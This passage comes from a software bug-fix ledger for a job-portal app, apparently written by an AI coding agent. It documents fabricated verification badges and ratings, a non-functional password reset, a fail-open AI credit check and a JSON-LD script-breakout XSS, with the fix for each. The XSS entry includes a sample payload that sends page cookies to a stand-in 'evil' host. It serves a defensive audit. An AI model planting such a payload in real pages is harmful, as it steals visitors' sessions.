Verified Candidate' card. **External impact, not just self-view:** `SeekerIDCardProps` is also rendered on the public `portfolio/seeker/[id]` page (`SeekerPortfolioClient.tsx`), so a stranger — an employer deciding whether to trust a candidate's stated experience and education — sees the same unconditional 'Verified Candidate' badge on every candidate's public profile, with the badge's claim resting on nothing the platform actually checked. No verification mechanism is added — none exists to add cheaply, and inventing one is a separate, larger feature decision (document upload, admin review queue), not this fix. | `thenijobs/trust9-company-card-ignores-real-verification-status` | `916a3dd` | MERGED_DEVELOP | 2026-09-05 | owner ("start fixing all these bugs one by one", 2026-09-05) via phase TRUST-9 | **Unlike TRUST-8's seeker card, a real admin-reviewed verification system exists here — the company visiting-card component just never checks it.** Found reading `CompanyIDCard.tsx` (flagged in the same lint output as TRUST-8's `SeekerIDCard.tsx`) as the obvious next place the same bug family could recur. `company.verificationStatus` is a real, extensively-used field: companies register with `verificationStatus: 'pending'` (`register-business/page.tsx:128`, `company/register/page.tsx:83`), an admin reviews and sets it to `'verified'`/`'rejected'` in `admin/businesses/page.tsx`, and it genuinely gates real behaviour across the app — which companies list on `/businesses`, `/services`, the homepage 'Trusted Employers' strip and stats, marketplace filtering, and the blue checkmark badge on the public `company/[slug]` profile page. **The enclosing page already computes this correctly**: `employer/id-card/page.tsx:50` has `const isVerified = company.verificationStatus === 'verified';` and shows an honest amber 'Verification in progress' banner when false (`:60-70`, left untouched by this phase — it is already correct). But `CompanyIDCardProps.company.verificationStatus?: string` (`CompanyIDCard.tsx:33`) is declared and **never read anywhere in the component** — a grep for the field inside the file returns only its own type declaration. The badge (`:142`, `Verified Partner · THENIJOBS`) and the WhatsApp share text (`:107`, `Official Digital Visiting Card` ... `verified profile, catalog & openings`) are unconditional literals, printed identically whether the company is verified, pending, or rejected. So while the surrounding page correctly warns 'Verification in progress' for an unverified company, the card sitting directly below that same warning on the same screen — and the text an employer shares externally over WhatsApp — both still say 'Verified Partner'. This is closer to PAY-2's shape than TRUST-6/7/8's: a real, correctly-computed signal exists and is even displayed correctly one level up; it simply was never threaded into the reusable component that needed it. `employer/id-card/page.tsx` carries three more unconditional claims of its own, independent of the card component: `:39` ('official ... digital visiting card with a verified QR pass', shown on the no-company-yet empty state), `:56` ('Your official company visiting card...'), `:93` ('QR code opens your live verified products & services catalogue' — there is no product-level verification concept anywhere in this app for this line to refer to). Fix: compute `isVerified` inside `CompanyIDCard` itself from the `company.verificationStatus` prop it already receives, and make the badge and WhatsApp text conditional on it — 'Verified Partner · THENIJOBS' / 'verified profile' only when true, an honest 'Digital Visiting Card · THENIJOBS' / plain 'profile' otherwise. Drop 'Official' from both the badge context and the page's own copy at `:39`/`:56`, matching TRUST-8's treatment, and drop the unfounded 'verified' from `:93`'s products/services line. The existing `!isVerified` banner (`:60-70`) is correct as-is and is not touched. Expected files: `src/components/id-card/CompanyIDCard.tsx`, `src/app/employer/id-card/page.tsx`, this ledger. Never touches `firestore.rules`, `admin/businesses/page.tsx`, any other company/employer page, the seeker id-card files already fixed in TRUST-8. | `thenijobs/sec5-password-reset-is-fake` | `9a85e29` | MERGED_DEVELOP | 2026-09-05 | owner ("start fixing all these bugs one by one", 2026-09-05) via phase SEC-5 | **A real user locked out of their account has no working way to get back in — the app's only two password-recovery mechanisms are both non-functional.** The most severe finding of this session: not a UI trust issue or a legal-document issue, but a complete account-recovery failure with immediate, direct harm to any real user who forgets their password. Found while reading `admin/users/page.tsx` for an unrelated sweep and noticing a `tempPassword` field written on save. **(1) `src/app/forgot-password/page.tsx` sends no email at all.** `handleSubmit` (`:13-19`) is `await new Promise(r => setTimeout(r, 1200))` followed by unconditionally `setSent(true)`. There is no `sendPasswordResetEmail` call, no API request, nothing — a repository-wide grep for `sendPasswordResetEmail` returns zero matches anywhere in `src/`. The page then displays 'Email Sent! We've sent a password reset link to {email}. Please check your inbox' (`:68-71`) and a trust row claiming 'Secure reset link, Expires in 1 hour, No password stored in plain text' (`:26`) — every one of these claims describes a mechanism that does not exist. Any real THENIJOBS user who forgets their password and uses this page is told an email was sent when none was. **(2) `admin/users/page.tsx`'s edit-user modal has a field labelled 'Account Password / Temp Password'** (`:490-511`) with helper text 'Set a temporary or updated password for this user,' a show/hide eye-icon toggle, and a save handler that writes the typed value to `users/{uid}.tempPassword` in Firestore (`:131`) — and pre-fills the SAME field from that stored value the next time the modal opens (`:101`, `newPassword: u.tempPassword || ''`). A grep for `tempPassword` and for any Firebase Admin SDK, Cloud Function, or `updatePassword` call anywhere in `src/` finds **no connection whatsoever to the user's actual Firebase Authentication credential** — writing this field changes nothing about what password lets the user sign in. This is doubly wrong: functionally, an admin who tells a user 'I've reset your password to X' has changed nothing, and the user's real credential is untouched; and as a security matter, it persists a value **labelled and treated exactly like a real password — plaintext, revealable via a Show/Hide toggle** — in a Firestore document `firestore.rules` already makes readable by the user themself or any admin (`allow read: if isOwner(userId) || isAdmin()`), for zero functional benefit. **Why this cannot be built as a real 'set arbitrary password' feature and why that is the right scope boundary, not a shortcut:** this app is a static export with no `src/app/api/**` route in production and no Firebase Admin SDK anywhere in the repository (confirmed by CLAUDE.md's own repository facts) — a client app can never set another user's Firebase Auth password directly; that capability requires a privileged Admin SDK context (Cloud Functions or a real backend), which does not exist here. Building it is a backend-infrastructure project, not a bug fix. **What the client SDK genuinely can do, with no backend at all: `sendPasswordResetEmail(auth, email)`**, a real, fully client-side Firebase Auth API, already available via the `auth` export in `src/lib/firebase/config.ts` and already imported the same way elsewhere in the app (`AuthContext.tsx`). This sends Firebase's own real reset-link email and requires zero new infrastructure. Fix: (a) `forgot-password/page.tsx` calls the real `sendPasswordResetEmail(auth, email)`; on success **or** `auth/user-not-found`, show the same 'Email Sent' state (preserving the existing behaviour's one accidentally-correct property — not leaking which emails are registered — while making the underlying action real for every email that *is* registered); a genuine send failure (network, misconfigured project) surfaces a visible inline error instead of a false success. (b) `admin/users/page.tsx` removes the fake password field, its `tempPassword` persistence, the show/hide toggle, and the pre-fill-from-stored-value logic entirely, replacing it with a 'Send password reset email' action that calls the same real API against the user's own registered email — a genuinely working tool for an admin helping a locked-out user, instead of a field that silently did nothing. **Deliberately not folded into this phase, logged separately:** the same file's `handleCreateUser` (`:149-177`) creates only a Firestore document with a random auto-ID via `setDoc(doc(fbCollection(db, 'users')))` — no Firebase Auth account, no real UID — so the 'user' it creates can never sign in at all, despite the 'User created successfully!' toast. This is a related but architecturally distinct problem (client SDK creating another user's real Auth account either needs the Admin SDK this app doesn't have, or a secondary-app client-SDK workaround with its own session-disruption risks) and is recorded as a new BLOCKED finding rather than expanded into this diff. Expected files: `src/app/forgot-password/page.tsx`, `src/app/admin/users/page.tsx`, this ledger. Never touches `firestore.rules`, `AuthContext.tsx`, `login/page.tsx`, `register/page.tsx`, any other auth page. Also not claimed: a fix to `handleCreateUser`'s orphaned-document problem, logged separately. **Built and merged 2026-09-05.** Commits: claim `344d582`, fix `9a85e29`, merge `505951f`. Since `loading` is false and `jobs` is non-empty from the first render, the component's own render order (`loading ? skeleton : error ? message : jobs.length === 0 ? empty-state : jobs.map(...)`) falls straight through to rendering the **fake jobs**, on every single page load, for the full duration of the async Firestore query. On a thrown fetch error the `catch` block never calls `setJobs`, so the fake data would also survive an error indefinitely (though the `error` render branch happens to mask it in that specific case). Real fetched jobs also default `isVerified: d.isVerified ?? true` — any real job document missing the field is displayed as 'Verified' with nothing checking it. **(2) `FeaturedBusinesses.tsx`**: identical shape — `useState<Company[]>(INITIAL_FEATURED_COMPANIES)` (`:255`), `loading` never set `true` before the fetch, so eight more hardcoded fake companies with invented ratings/review counts/job counts render on every page load until the fetch resolves. A second, independent bug in the same file: real fetched companies compute `isVerified: d.isVerified || true` (`:284`) — using `||` instead of `??` means a real company explicitly stored with `isVerified: false` still evaluates to `true`, since `false || true` is `true`. `admin/businesses/page.tsx:272` does write `isVerified: editBizForm.verificationStatus === 'verified'`, so a rejected or since-unverified company can genuinely hold `isVerified: false` in Firestore — this operator bug silently overrides that back to 'Verified' on the home page card. **(3) `TrustedEmployersStrip.tsx` is the most severe of the three: it can substitute fake data forever, not just during a loading window.** `useState<EmployerLogo[]>(INITIAL_EMPLOYERS)` (`:28`) seeds six more hardcoded fake companies (with real-looking slugs like `digital-theni-solutions`, each linked to `/company/{slug}`), and this file has **no loading state at all**. After a successful, real query for verified+active companies, `if (logos.length >= 3) { setEmployers(logos); }` (`:50`) — **the fake data is kept even on total success if the platform currently has fewer than 3 real verified+active companies**, which is plausible for a young platform. On any fetch error the `catch` block is a bare comment: `// Silently retain pre-seeded verified employers` (`:54`) — the fallback to fake data on error is explicit, deliberate, and named as such in the code, not an oversight. The section is headed 'Featured Employers' with a `BadgeCheck` verification icon and the caption 'Local companies using THENIJOBS to connect with talent' — every one of the six fabricated logos, if real threshold isn't met, sits under that exact framing, linked to a company slug that may not exist in the database at all. Fix: remove all three `INITIAL_*` hardcoded fallback arrays entirely. `TrendingJobs.tsx` and `FeaturedBusinesses.tsx` initialize their lists empty and `loading` to `true`, so the existing skeleton-loading branch renders correctly during the fetch instead of fake data ever painting; `FeaturedBusinesses.tsx`'s `isVerified: d.isVerified || true` becomes `d.isVerified ?? true`, matching the `??` already used correctly elsewhere in the same file family (`TrendingJobs.tsx`, `CompanyLandingPageClient.tsx`, `marketplace/page.tsx`). `TrustedEmployersStrip.tsx` initializes empty, replaces the `>= 3` gate with an unconditional `setEmployers(logos)` (even zero or one or two real results are more honest than six fake ones), sets `employers` to empty on a genuine fetch error instead of retaining the fake seed, and the whole section renders nothing when `employers.length === 0` rather than showing an empty 'Featured Employers' strip with no content or, worse, stale fake logos. Expected files: `src/components/home/TrendingJobs.tsx`, `src/components/home/FeaturedBusinesses.tsx`, `src/components/home/TrustedEmployersStrip.tsx`, this ledger. Never touches `src/app/page.tsx`, `sampleCompanies.ts`, `firestore.rules`, any other home component. | `thenijobs/trust12-new-companies-start-with-fake-perfect-rating` | `5747ab7` | MERGED_DEVELOP | 2026-09-05 | owner ("start fixing all these bugs one by one", 2026-09-05) via phase TRUST-12 | **New companies are created with a fabricated 4.8-5.0 star rating and zero real reviews, and eight display components fall back to the same fabricated numbers whenever the real value is missing — directly observed live in production during TRUST-10's browser check ('5.0 (0)', '4.8 (0)').** Found chasing the same rating trail that led to TRUST-11's testimonials; this is the numeric-defaults half of that sweep, deliberately kept separate since it is a mechanically distinct fix (defaults across ten files, not deleting one component). **Write-side (company creation) — three paths, one bug each:** `register-business/page.tsx:132` and `seeker/become-employer/page.tsx:199` both write `rating: 5.0, reviewCount: 0` in the same document that also sets `verificationStatus: 'pending'`, `isActive: false`, `isVerified: false` — a perfect score paired with zero evidence, self-contradicting the same object's own pending status. `src/lib/firebase/bulkCompanyService.ts:237` writes `rating: 4.8, reviewCount: 0` for every bulk-imported company. Two OTHER creation paths already get this right — `company/register/page.tsx:87` and `adminUserService.ts:156` both write `rating: 0` — proving this isn't a deliberate platform-wide choice, just two (three) write paths that never matched the correct pattern already established elsewhere in the same codebase. **Display-side — the same fabrication recurring wherever a company/service's own aggregate rating is read with a non-zero fallback:** `company/[slug]/CompanyProfilePageClient.tsx:148` `const rating = company.rating || 5` (fed into a schema.org `aggregateRating.ratingValue` JSON-LD block whenever `reviewCount > 0`, so a company with real reviews but no stored `rating` value would tell Google a false 5.0 in structured data); `admin/reports/page.tsx:103` `rating: c.rating || 4.5` (corrupts the admin's own internal analytics, not just a public page); `services/page.tsx:83` `rating: d.rating || 4.8`; `FeaturedBusinesses.tsx:152` `rating: d.rating || 4.5` (a second bug in the same block TRUST-10 already touched for `isVerified` — this rating default was missed in that phase and is closed here). Four OTHER display sites already use the correct `|| 0` pattern (`businesses/page.tsx:219`, `BusinessCategoryPageClient.tsx:70`, `CompanyProfilePageClient.tsx:347`, `CompanyProfileClient.tsx:191,882`), confirming the correct convention already exists and these four are the outliers. **Checked and deliberately excluded, not missed:** `CompanyLandingPageClient.tsx:126` and `CompanyProfilePageClient.tsx:120` both read `rating: d.rating || 5` too, but reading the surrounding code shows `d` there is a real, already-approved individual REVIEW document (`d.userName`, `d.comment`, `where('status','==','approved')`), not the company's own aggregate rating — a defensive default on a specific reviewer's own star rating in the rare case a real approved review is missing one, the same category as the portfolio-template per-review defaults excluded below, not a platform-invented company-wide trust signal. **One more instance, structurally different but same root cause:** `CompanyReviewsSection.tsx:26`'s `averageRating` prop defaults to `5.0` — currently dead in practice, since its one real caller (`CompanyProfileClient.tsx:882`) always explicitly passes `company.rating || 0`, but a fabricated default on a shared, reusable component is a live risk for any future caller and is fixed for the same reason the write-side defaults are. **Explicitly out of scope, and named as such rather than silently expanded into:** portfolio-template star-count defaults (`CorporatePremium.tsx`, `ProfessionalCompany.tsx`, `ServiceMarketplace.tsx`, `LocalBusinessPro.tsx`, `BusinessShowcase.tsx`, `CompanyLandingWebsite.tsx` — all `rating||5` on a per-testimonial star icon COUNT for content a business owner enters themselves on their own portfolio site, not the app inventing a rating about a third party) and `employer/website/templates/page.tsx`'s hardcoded template-preview testimonials (design-preview content shown to an employer choosing a template, not published as real). Both are a different character of default — cosmetic, on user-authored content — from a platform-wide company/service rating asserted about a business to the public. Fix: change every write-side `rating: 5.0`/`4.8` to `rating: 0`, matching `company/register/page.tsx`/`adminUserService.ts`'s already-correct pattern; change every display-side `|| 5`/`|| 4.5`/`|| 4.8` fallback to `|| 0`, matching `businesses/page.tsx`'s already-correct pattern; change `CompanyReviewsSection`'s `averageRating = 5.0` default to `= 0`. | `thenijobs/sec6-ai-credit-check-fails-open` | `981949a` | MERGED_DEVELOP | 2026-09-05 | owner ("start fixing all these bugs one by one", 2026-09-05) via phase SEC-6 | **The AI credit check does not merely fail open in a rare edge case — it is structurally impossible for it to succeed at all, so every authenticated call to `/api/ai` gets unlimited access to real, cost-incurring provider calls (Groq/Gemini/OpenAI) with the balance check fabricating a permanent 'yes, you have 100 credits.'** Found reading `hazards.md`'s known-but-unmeasured trap list ('`checkUserCredits()` fails open... on a read error') and tracing why the error path is actually reached. `src/lib/ai/creditService.ts`'s `checkUserCredits()` (`:18-58`) calls `getDoc(doc(db, 'users', userId))` using the **client** Firestore SDK (`db` from `src/lib/firebase/config.ts`). `src/app/api/ai/route.ts` runs this from a Next.js **API route** (server-side Node.js), which verifies the caller's ID token via a stateless REST call to `identitytoolkit.googleapis.com/v1/accounts:lookup` (AI-1's fix) to obtain `authenticatedUserId` as a plain string — it never calls any Firebase Auth SDK sign-in method (`signInWithCustomToken` or equivalent; confirmed by grep, zero matches for `signInWith` anywhere in `route.ts`, `creditService.ts`, or `config.ts`). This means the `db` instance's own `auth.currentUser` is permanently `null` for the life of the server process — every Firestore request it makes carries `request.auth == null`, regardless of how thoroughly the route itself verified the caller's identity as a separate, parallel fact. `firestore.rules`'s `users/{userId}` block requires `allow read: if isOwner(userId) || isAdmin();` — `isOwner` needs `request.auth.uid == userId`, which an unauthenticated request can never satisfy. **The `getDoc` call is therefore denied every single time**, throwing a `permission-denied` FirebaseError on every invocation, not occasionally. `checkUserCredits`'s `catch` block (`:53-56`, labelled 'Graceful fallback during dev if field isn't set') returns `{ allowed: true, requiredCredits, currentBalance: 100 }` unconditionally on **any** error — meaning it returns this fabricated, always-sufficient balance on **every real request**, not as a fallback for a rare failure. **The companion function is equally broken, in a way that compounds rather than offsets the risk.** `deductUserCredits()` (`:61-78`) calls `updateDoc(userRef, { aiCreditsUsed: increment(...) })` through the same unauthenticated `db` instance — denied for the identical reason, `catch` returns `false`, and `route.ts:337` awaits it **without checking the return value**, after the (real, billed) AI provider call has already completed (`:326` onward) and the response already built. So even setting the authentication problem aside, this is a post-hoc, non-transactional deduct with no reservation step. **Confirmed this is not fixable by simply authenticating the request as the calling user, the way `SEC-5` fixed password reset**: `firestore.rules`'s own `userModerationUnchanged()` helper (`:86-93`) explicitly excludes `aiCredits`/`aiCreditsUsed` from what a user may ever change on their own document, with its own comment naming the reason — 'credits, plan and employer-grant fields are admin/server-owned (security.md S-3).' Even a genuinely authenticated request from the owning user would still be denied on write, by design — the app's own security model already declared credit fields must be written by a privileged/admin/server identity, which this repository has nowhere: no Firebase Admin SDK anywhere (confirmed by CLAUDE.md's own repository facts), no Cloud Functions, no privileged backend of any kind. Building the real capability needs one of those, which is infrastructure this phase does not add — the same class of gap `SEC-5` found for admin-side password setting and `ADMIN-1` found for admin-side account creation. **Current blast radius**: this route 404s in production (static export, per CLAUDE.md rule 1), so today the exposure is limited to `next dev` — a developer or the owner testing AI features locally, with a real provider API key configured, incurs real, completely unbounded provider cost with the credit system offering zero actual protection. If the hosting model changes (`D-HOSTING`, still an open owner decision per earlier phases), this becomes a live, unbounded-cost production exploit on day one. Fix, bounded to what is achievable without new backend infrastructure: change `checkUserCredits`'s catch block from fail-**open** to fail-**closed** — `{ allowed: false, requiredCredits, currentBalance: 0, message: '...' }` — so a credit check that cannot be verified refuses the request instead of fabricating unlimited access. This makes every credit-gated AI feature return an honest 'credits could not be verified' error under `next dev` today, rather than silently costing the owner real money while claiming to enforce a limit it structurally cannot enforce. That is the correct, safe default until the real capability (an authenticated write path for credit fields) is built. **Deliberately not attempted:** fixing `deductUserCredits` the same way (fail-closed there has no independent effect, since it already fails safely by returning `false` and its result is unchecked) or building real credit enforcement (needs the Admin SDK/Cloud Functions infrastructure named above) — both logged as a new BLOCKED finding (`CREDIT-1`) rather than expanded into this diff. Expected files: `src/lib/ai/creditService.ts`, this ledger. Never touches `firestore.rules` (the `userModerationUnchanged` exclusion of credit fields is correct and stays), `src/app/api/ai/route.ts`, any AI provider client, `AuthContext.tsx`. | `thenijobs/trust13-any-reviewer-is-badged-verified-candidate` | `5171c6b` | MERGED_DEVELOP | 2026-09-05 | owner ("start fixing all these bugs one by one", 2026-09-05) via phase TRUST-13 | **Every company review carries a green '✓ Verified Candidate' badge, and nothing about the reviewer is ever checked — not their role, not whether they applied to or worked at the company, nothing.** Found sweeping every remaining `!== false` default-to-true pattern after TRUST-10/12's operator-bug findings; this is the one instance among ~20 checked (the rest are UI-preference defaults on a user's own content — section visibility, WhatsApp-enquiry toggles, open-to-work status — where defaulting to 'on' is the sensible, low-stakes convention) that asserts a verification claim about a person, to the public. `src/components/company/CompanyReviewsSection.tsx`'s `handleSubmitReview()` (`:54-91`) gates submission on nothing but `if (!user)` — not role, not `job_seeker` specifically, not any relationship to the company — then writes `isVerifiedSeeker: true` (`:72`) into every single review document **unconditionally**. Not a missing-field default, like TRUST-8/9/12 — an explicit, always-true literal written at creation time for every reviewer, with zero check behind it. The display side compounds it: `r.isVerifiedSeeker !== false` (`:188`) shows the badge for anything except an explicit `false`, so even a hypothetical different write path that simply omitted the field would still show it. A grep for every write and read of `isVerifiedSeeker` in `src/` finds exactly these two lines plus the type declaration (`types/index.ts:164`) — there is no verification mechanism anywhere to check a reviewer's real relationship to the company being reviewed. **Concretely exploitable, not theoretical**: any signed-in account — including an employer or business owner, since role is never checked — can submit a review of any company (including, with nothing stopping them, their own competitor's, or their own company under a second account) and it displays with an authoritative 'Verified Candidate' checkmark once an admin approves it. `admin/reviews/page.tsx`'s own moderation queue does not surface this field at all (confirmed by grep — zero matches), so an admin approving or rejecting a submission has no visibility into the fact that every single review claims the same fabricated credential; the badge is not even a usable signal for the one human check this flow has. Fix: stop writing the fabricated claim — remove `isVerifiedSeeker: true` from `handleSubmitReview`'s `createDocument` call entirely, matching TRUST-8's precedent of not substituting a different unearned default in its place. Tighten the display check from `!== false` (shows unless explicitly denied) to `=== true` (shows only if explicitly, genuinely granted) so the badge's absence is now the honest default, not its presence — this also means a future real verification feature (checking an actual application/employment record before setting the field) would work correctly the day it's built, without this display logic needing to change again. The type declaration and the conditional render block stay, since the field and the badge slot are not inherently fake — only the current, always-true write is. | `thenijobs/trust14-every-self-typed-skill-is-badged-verified` | `7b2f56b` | MERGED_DEVELOP | 2026-09-05 | owner ("start fixing all these bugs one by one", 2026-09-05) via phase TRUST-14 | **Every skill on every seeker's public portfolio shows a blue 'Verified Skill' shield checkmark, for a skill the seeker typed in themselves seconds earlier, with no verification of any kind and no awareness it happened.** Found immediately after `TRUST-13`, checking for the same 'auto-badged, no real check' shape elsewhere in the codebase; confirmed there is no company-side equivalent. `src/components/portfolio/SeekerSiteEditor.tsx` sets `verified: true` in four places, unconditionally: when the skills section auto-populates from the seeker's own profile data (`:230`, mapping every real profile skill; `:233-234`, the two placeholder skills used when the profile has none), when the seeker's profile is re-synced into the editor later (`:501`), and every time the seeker clicks 'Add Skill' to add a brand-new entry (`:961`, literally named `'New Skill'` at the moment of creation). A grep for `.verified` (property access, as opposed to the literal `verified:` writes) anywhere in this same editor file finds **nothing** — there is no checkbox, no toggle, no UI control of any kind that lets the seeker see this field exists, let alone change it. It is set silently, every time, with no exception. `src/components/portfolio/templates/SeekerPortfolioRenderer.tsx:347` renders it for real: `{skill.verified && <ShieldCheck ... title="Verified Skill" />}` — the same `ShieldCheck` icon this codebase uses elsewhere for genuine, third-party-checked verification (company verification badges, the seeker ID card before `TRUST-8`/`TRUST-9` fixed those). A seeker can type any string as a skill name — the field has no validation against a known skills list — and it is presented to every employer who views their public portfolio as if the platform had checked it. **Wider reach than `TRUST-13`, same root cause**: `TRUST-13` was one badge per review, gated behind admin approval before going live; this is every skill, on every seeker's public page, live the moment it is typed, with no moderation step at all. Fix: remove `verified: true` from all four write sites; the field becomes `undefined` for every new and re-synced skill, which the already-correct conditional render (`skill.verified &&`) then correctly treats as unverified — no display-side change needed, unlike `TRUST-10`/`TRUST-12`'s operator fixes, since this bug was purely in the write path, not a loose comparison. Expected files: `src/components/portfolio/SeekerSiteEditor.tsx`, this ledger. Never touches `SeekerPortfolioRenderer.tsx` (its conditional render is already correct once the write stops), `firestore.rules`, any company-side portfolio file. | `thenijobs/trust15-jobs-and-featured-businesses-fabricate-verified` | `3ec516b` | MERGED_DEVELOP | 2026-09-05 | owner ("start fixing all these bugs one by one", 2026-09-05) via phase TRUST-15 | **Three public listing components fabricate an unconditional 'Verified' badge on jobs and businesses whose underlying document never actually carries that field, while every sibling listing in the same codebase already uses the honest, established default for the identical field.** Found sweeping for the remaining `?? true`/`|| true` missing-field-defaults-to-true pattern after the `TRUST-12`/`13`/`14` family closed the `!== false` instances. `src/app/daily-jobs/page.tsx:132`, `src/components/home/TrendingJobs.tsx:210` and `src/components/home/FeaturedBusinesses.tsx:155` all write `isVerified: d.isVerified ?? true` when mapping a raw Firestore document into their display model. **Confirmed the field is never actually true in the data these two job listings read**: `src/app/employer/post-job/page.tsx` is the only employer-facing job-creation path that gates on real verification (`isCompanyVerified = company?.verificationStatus === 'verified' || company?.isVerified === true`, `:265`, blocking the whole form for an unverified company) — but the `isVerified` value is only ever passed to the pre-submit `<JobPreviewModal>` (`:797`, `:804`); the actual `jobPayload` written via `createDocument('jobs', jobPayload)` (`:176-208`) has no `isVerified` key at all. The other two job-creation call sites (`employer/jobs/page.tsx:154`, `employer/jobs/[id]/EmployerJobDetailClient.tsx:117`, both a 'duplicate job' action) only ever spread an existing job's fields through, which never had the key either. **The field is therefore `undefined` on every job document that exists or ever will, with today's code, and `?? true` converts every one of them into an unconditional, unearned 'Verified' checkmark** (`BadgeCheck`, rendered at `daily-jobs/page.tsx:341` and `TrendingJobs.tsx:64`) — the same shape as `TRUST-8`/`TRUST-9`/`TRUST-12`'s family, but here the write-side omission means the badge cannot be correct by accident even some of the time. **The rest of the codebase already knows the right answer**: `src/app/jobs/page.tsx:400`, `src/app/jobs/[id]/JobDetailPageClient.tsx:175` and `src/app/businesses/page.tsx:222` all map the identical raw field with `d.isVerified || false` — the honest default used everywhere else a job or business is listed. `src/components/seo/LocationJobPageClient.tsx` and `CategoryJobPageClient.tsx` render `job.isVerified &&` directly with no default at all, which is equally safe since the field is always `undefined`. Only these three components diverge from the codebase's own established convention. **`FeaturedBusinesses.tsx` is currently masked, not safe**: its query (`where('verificationStatus', '==', 'verified')`, `:139`) happens to only ever return already-verified companies today, so the wrong default has produced no visibly-wrong output yet — but it is the same fossilized-wrong-default risk `TRUST-12` already found worth closing even where a query coincidentally masks it, since the masking is an accident of the current query, not a guarantee. Fix: change all three call sites from `?? true` to `|| false`, matching the exact convention already used at `jobs/page.tsx:400` and `JobDetailPageClient.tsx:175`. No display-side change needed — the existing `job.isVerified &&`/`{job.isVerified && <BadgeCheck />}` conditionals are already correct once the mapped value stops being fabricated. Expected files: `src/app/daily-jobs/page.tsx`, `src/components/home/TrendingJobs.tsx`, `src/components/home/FeaturedBusinesses.tsx`, this ledger. Never touches `src/app/employer/post-job/page.tsx`, any other job-creation call site, `firestore.rules` (`safeJobCreate()` does not restrict `isVerified` either way), `JobDetailPageClient.tsx`, `jobs/page.tsx`, `businesses/page.tsx`, `LocationJobPageClient.tsx`, `CategoryJobPageClient.tsx` (all five already correct). **Deliberately not attempted**: persisting `isVerified: isCompanyVerified` onto the real `jobPayload` at creation time in `post-job/page.tsx`, even though the value is already computed there and it would make the badge genuinely showable for new jobs from verified companies. Considered and set aside for this phase: a value written once at creation time goes stale the moment the owning company's verification is later revoked by an admin — the job would keep an honest-at-creation but now-false 'Verified' claim forever, with no sync mechanism this repository has (no Admin SDK, no Cloud Functions, the same missing-backend-capability gap `SEC-6`/`CREDIT-1`/`PAYMENT-1` already named) — a smaller version of today's bug, not a full fix, and touching the job-creation write path is a materially higher-risk change than three one-line display-default fixes. Logged as a candidate follow-up phase rather than bundled here, matching this session's practice of keeping a phase to one bounded concern. Every job already in production today keeps showing no badge either way (the field was never set before this fix and is not set after it) — this phase does not touch already-written documents, only stops new mismapped reads. | `thenijobs/sec7-json-ld-script-breakout-xss` | `7d98815` | MERGED_DEVELOP | 2026-09-05 | owner ("start fixing all these bugs one by one", 2026-09-05) via phase SEC-7 | **Every JSON-LD structured-data block this app injects via `dangerouslySetInnerHTML={{ __html: JSON.stringify(x) }}` is vulnerable to the textbook `</script>` breakout — and two of the fourteen unprotected sites carry live, employer- or seeker-controlled free text into a fully public, unauthenticated page, making this a real stored-XSS, not a theoretical one.** `JSON.stringify` does not escape `<`, `/`, or `<!--`; when its output is placed inside a `<script type="application/ld+json">` tag via `dangerouslySetInnerHTML`, a data value containing the literal text `</script>` is read by the **HTML parser**, not the JS parser — it closes the script element early and whatever text follows executes as a new element in the page, for every visitor, no interaction required. **Confirmed live and exploitable, not masked by anything**: `src/app/jobs/[id]/page.tsx` builds both `breadcrumbSchema` (`:117`, `name: job.title` — raw) and `jobPostingSchema` (`:123-149`, via `generateJobPostingSchema()` in `src/lib/seo/jobSchema.ts`, which puts `job.title`/`job.description`/`job.companyName` straight into the schema with zero sanitization anywhere in that function) directly from Firestore `jobs` documents that `src/app/employer/post-job/page.tsx` writes verbatim from `form.title.trim()`/`form.description.trim()` — a `.trim()` removes whitespace, not `<`. Any verified employer (post-job already requires `isCompanyVerified`, so this needs a real, approved account, not an anonymous visitor, but every approved employer clears that bar) can post a job titled `Cook</script><script>fetch('https://evil/'+document.cookie)</script>` and every visitor to that job's public page — and to the corresponding `jobs-in-<district>`/category location pages once the job appears there — runs it. `src/app/portfolio/[username]/PublicPortfolioPageClient.tsx`'s `personSchema` (`:128-145`) puts `heroData.name`/`heroData.title` — a seeker's own portfolio hero fields, self-edited with no server-side sanitization found anywhere in `SeekerSiteEditor.tsx` — into the same unescaped path on every seeker's public portfolio, `/portfolio/<username>`, reachable by any signed-up seeker with zero approval gate (unlike employer job posting). **This codebase already has the correct fix, in exactly one place**: `src/app/[companySlug]/CompanyLandingPageClient.tsx:24-27` defines `sanitizeForJsonLd()` — `str.replace(/<\//g, '<\\/').replace(/<!--/g, '<\\!--')`, its own comment reading 'prevent </script> breakout' — and applies it field-by-field to every company value it interpolates (`:192-199`). It is never exported, so every other JSON-LD site in the app — `page.tsx` (home), the nine `jobs-in-<district>/page.tsx` files, `jobs/[id]/page.tsx` (both blocks), `LocationCategoryPage.tsx`, `FAQSection.tsx`, `PublicPortfolioPageClient.tsx` — has zero protection. Same shape as `ADMIN-1`→`ADMIN-2` and `TRUST-9`: a real, working fix sitting unused beside every place that needed it. **Fix, matching the existing, already-correct escape rather than inventing a competing one**: new `src/lib/seo/jsonLd.ts` exports `toJsonLdScript(data: unknown): string`, applying the identical `<\//<!--` escape to the **whole** serialized JSON string at the point closest to `dangerouslySetInnerHTML`, rather than requiring every schema-builder to remember to sanitize each field it adds (the failure mode that left thirteen sites unprotected in the first place). Update the fourteen unprotected `dangerouslySetInnerHTML={{ __html: JSON.stringify(x) }}` call sites (`page.tsx`, the nine `jobs-in-*` pages, both blocks in `jobs/[id]/page.tsx`, `LocationCategoryPage.tsx`, `FAQSection.tsx`, `PublicPortfolioPageClient.tsx`) to `toJsonLdScript(x)`. The nine `jobs-in-*` pages, `LocationCategoryPage.tsx`, `FAQSection.tsx` and the home page's `homeStructuredData` all currently carry only hardcoded static strings (confirmed by reading each — no Firestore/user data reaches them today), so this closes a currently-static-but-fossilized risk the same way `TRUST-12`/`TRUST-15` closed masked-but-wrong defaults elsewhere, not a live exploit at those particular sites. Expected files: new `src/lib/seo/jsonLd.ts`; `src/app/page.tsx`; `src/app/jobs-in-{andipatti,bodinayakanur,chinnamanur,cumbum,dindigul,madurai,periyakulam,theni,uthamapalayam}/page.tsx`; `src/app/jobs/[id]/page.tsx`; `src/components/seo/LocationCategoryPage.tsx`; `src/components/home/FAQSection.tsx`; `src/app/portfolio/[username]/PublicPortfolioPageClient.tsx`; this ledger. **Never touches** `src/app/[companySlug]/CompanyLandingPageClient.tsx` — its own `sanitizeForJsonLd()` already prevents the same breakout via per-field escaping, applied before this fix existed; left exactly as is rather than migrated to the shared helper, since it already works and touching a working security control for stylistic consistency alone is not worth the risk. Never touches `src/lib/seo/jobSchema.ts`'s field-level logic, `generateBreadcrumbSchema()`, 